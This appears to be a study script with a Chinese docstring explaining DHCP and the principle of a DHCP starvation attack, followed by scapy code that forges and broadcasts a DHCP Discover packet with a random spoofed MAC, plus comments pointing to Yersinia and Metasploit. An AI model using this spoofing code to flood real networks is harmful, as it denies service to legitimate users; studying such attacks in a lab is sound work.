"""
    位于应用层的常见协议有：HTTP,FTP,DNS,DHCP等,这里以DHCP为例（DHCP：动态主机配置协议）
    DHCP主要作用：集中地管理，分配IP地址，使网络环境中的主机动态地获取IP地址，网关地址等信息

    DHCP采用客户端/服务端模型：

        客户端操作：1.客户端广播DHCP Discover消息
        服务端操作：2.服务器提供地址租约Offer
        客户端操作：3.客户端选择并请求Request
        服务端操作：4.服务器确认ACK

    攻击原理：
        攻击机恶意伪造大量DHCP请求报文发送到服务器，这样DHCP服务器地址池中的IP地址会很快就分配完毕
        从而导致合法用户无法申请到IP地址，同时大量的DHCP请求也会导致服务器高负荷运作，从而导致设备瘫痪


"""
from scapy.all import *
import binascii

xid_random = random.randint(1, 900000000)
mac_random = str(RandMAC())
client_mac_id = binascii.unhexlify(mac_random.replace(':', ''))
print(mac_random)
# 这个构造过程比较麻烦
dhcp_discover = Ether(src=mac_random, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(
    sport=68, dport=67) / BOOTP(chaddr=client_mac_id, xid=xid_random) / DHCP(
    options=[("message-type", "discover"), "end"])
sendp(dhcp_discover, iface='以太网')
print("\n\n\nSending DHCPDISCOVER on " + "以太网")
# 可以打开WireShark，将过滤器设置为udp，然后执行上面的程序
#  可以使用Kali中的Yersinia (拒绝服务工具),或使用Matasploit
